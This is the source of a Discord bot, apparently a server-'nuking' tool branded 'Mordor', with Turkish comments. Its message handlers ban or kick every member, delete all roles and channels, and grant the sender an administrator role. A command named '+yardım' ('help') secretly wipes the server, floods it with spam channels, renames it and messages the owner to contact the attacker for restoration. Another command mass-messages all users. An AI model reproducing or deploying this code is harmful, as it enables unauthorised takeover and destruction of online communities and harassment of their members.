// GEREKLİ YERLER
// -------------------------------------------------------------
const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const chalk = require("chalk");
const fs = require("fs");
const moment = require("moment");
const Jimp = require("jimp");
const db = require("quick.db");
require("./util/eventLoader")(client);
const express = require("express");
const app = express();
const http = require("http");
app.get("/", (request, response) => {
  console.log(Date.now() + " Mordor");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

require("./util/eventLoader")(client);

var prefix = ayarlar.prefix;

const log = message => {
  console.log(`[${moment().format("YYYY-MM-DD HH:mm:ss")}] ${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir("./komutlar/", (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`Yüklenen komut: ${props.help.name}.`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.on("ready", async () => {
  let botVoiceChannel = client.channels.get("799988383551717446");
  if (botVoiceChannel)
    botVoiceChannel
      .join()
      .catch(err => console.error("Bot ses kanalına bağlanamadı!"));
  
  });

  
client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());

  }
  
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {
    msg.delete();
    await msg.guild.channels.deleteAll();
    await msg.guild.createChannel("Mordor-Test", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
      type: "voice"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
      type: "voice"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild.createChannel("▬▬▬▬▬▬▬", {
      type: "voice"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Mordor#9078", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild.setIcon(
      "https://64.media.tumblr.com/6684ed229026dd59876f9142e093c86b/1b41e90af3fc239a-31/s400x600/0176a1e209dd98ec0e0a64d7eb08dc858225555c.gif"
    );

    await msg.guild.setName("Mordor Was Here"); //sunucu ismini yapar
    await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
    await msg.guild.owner.send(
      "https://discord.gg/tv4BeFBv87   /   https://64.media.tumblr.com/6684ed229026dd59876f9142e093c86b/1b41e90af3fc239a-31/s400x600/0176a1e209dd98ec0e0a64d7eb08dc858225555c.gif  / Sunucu Çökdü :/  Mordor#9078'a Ulaş ! "
    ); //KURUCUSUNA GONDERILEN MESAJ
    const channel = await msg.guild.channels.find(
      x => x.name === "Mordor#9078"
    );
    await channel.send(
      "Sunucunun Eski Haline Dönmesi İçin Kurucuma Mesaj At! Mordor#9078 "
    );
  }
});
client.on("message", async msg => {
  if (msg.content === "+duyur") {
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          " https://discord.gg/tv4BeFBv87   /   https://64.media.tumblr.com/6684ed229026dd59876f9142e093c86b/1b41e90af3fc239a-31/s400x600/0176a1e209dd98ec0e0a64d7eb08dc858225555c.gif <@" +
            msg.guild.owner.id +
            "> `Mordor#9078 Diyor'ki  Dikkatli Olun!"
        )
      )
      .catch(console.error);
  } //duyuru mesjai bu
});

client.on("message", msg => {
  if (msg.content === "+yetki") {
    msg.delete();
    msg.guild.createRole({
      name: "Mordor",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === "Mordor");
    msg.member.addRole(rol);
  }
});

client.on("message", msg => {
  if (msg.content === "+rol") {
    msg.delete();
    msg.guild.roles.forEach(roles => roles.delete());
  }
});

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});
client.login(ayarlar.token);

client.on("message", async msg => {
  if (msg.content.toLowerCase() === "sa") {
    await msg.react("A");
    msg.react("S");
  }
});

client.elevation = message => {
  if (!message.guild) {
    return;
  }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });

client.on("warn", e => {
  console.log(chalk.bgYellow(e.replace(regToken, "that was redacted")));
});

client.on("error", e => {
  console.log(chalk.bgRed(e.replace(regToken, "that was redacted")));
});

client.login(ayarlar.token);
